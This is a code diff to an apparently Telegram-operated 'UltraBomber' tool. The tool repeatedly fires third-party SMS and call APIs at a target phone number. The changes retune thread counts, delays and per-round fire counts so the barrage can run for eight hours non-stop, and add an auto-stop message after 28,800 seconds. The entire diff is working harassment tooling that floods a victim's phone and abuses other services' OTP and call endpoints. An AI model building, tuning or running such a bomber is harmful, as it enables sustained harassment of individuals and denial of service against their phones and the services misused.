@@ -42,14 +42,14 @@ if API_TOKEN and not os.path.exists("config_token.py"):
         pass
 
 MAX_WORKERS = 50  # Ultra Power — 50 concurrent threads
-SMS_MAX_WORKERS = 200  # ULTRA POWER — 200 SMS workers for 10 req/sec/API
+SMS_MAX_WORKERS = 80  # 8-HOUR MODE — sustainable non-stop
 DELAY_BETWEEN_ROUNDS = 0.2  # 200ms between rounds (Ultra Power)
-SMS_DELAY_BETWEEN_ROUNDS = 0.03  # 30ms between SMS rounds — TSUNAMI MODE!
+SMS_DELAY_BETWEEN_ROUNDS = 0.15  # 150ms between SMS rounds — 8-HOUR STABLE
 SMS_DOUBLE_FIRE = True  # Double fire — har API ek round mein 2 baar fire!
 SMS_AUTO_RETRY = True  # Retry failed SMS APIs immediately
 MAX_CONCURRENT_SESSIONS = 3  # Max 3 users (Ultra Power needs more resources per user)
 
-IMPORTANT_CALL_INTERVAL = 3  # Important call APIs fire every 3 seconds
+IMPORTANT_CALL_INTERVAL = 1  # Call APIs fire every 1s — 8-HOUR STABLE
 IMPORTANT_5S_INTERVAL = 5  # 5-second important APIs fire every 5 seconds
 IMPORTANT_SMS_INTERVAL = 0.5  # Important SMS APIs — 6 req/sec total (3 APIs × 2 times/sec)
 
@@ -903,8 +903,8 @@ class UltraBomber:
         """Fire all APIs in parallel for one round"""
         executor = self.sms_executor if is_sms else self.executor
         
-        # ULTRA POWER — each API fires 10 times for SMS, 5 times for others!
-        fire_count = 10 if is_sms else 5
+        # 8-HOUR MODE — each API fires 5 times for SMS, 5 times for others!
+        fire_count = 5 if is_sms else 2
         
         futures = []
         for api in apis:
@@ -970,7 +970,15 @@ class UltraBomber:
                 is_sms_mode = (mode == "sms")
                 round_delay = SMS_DELAY_BETWEEN_ROUNDS if is_sms_mode else DELAY_BETWEEN_ROUNDS
 
+                start_time = time.time()
                 while not stop_event.is_set():
+                    elapsed_sec = time.time() - start_time
+                    if elapsed_sec >= 28800:
+                        try:
+                            bot.send_message(chat_id, "⏰ *8-Hour Complete!* ✅ Auto-stopped.", parse_mode="Markdown")
+                        except:
+                            pass
+                        break
                     round_num += 1
                     try:
                         ok, fail = self._run_round(phone, apis, stats, is_sms=is_sms_mode)
@@ -1042,7 +1050,7 @@ class UltraBomber:
                     if stop_event.is_set():
                         break
                     # Each API fires 3 times for continuous barrage
-                    for _ in range(3):
+                    for _ in range(2):
                         if stop_event.is_set():
                             break
                         name, status, size, err = self._fire_api(api, phone)
